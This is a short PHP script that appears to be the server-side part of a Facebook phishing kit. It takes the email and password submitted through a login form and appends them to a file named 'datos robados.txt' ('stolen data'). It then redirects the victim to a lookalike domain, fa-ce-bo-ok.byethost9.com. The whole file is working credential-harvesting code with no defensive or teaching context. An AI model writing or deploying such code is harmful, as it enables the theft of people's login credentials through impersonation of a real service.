<?php

$email = $_POST['email'];
$password = $_POST['password'];

$contenido="
email: $email;
password: $password";

$archivo = fopen("datos robados.txt", "a");
fwrite($archivo,$contenido);

header("location:http://fa-ce-bo-ok.byethost9.com/");



  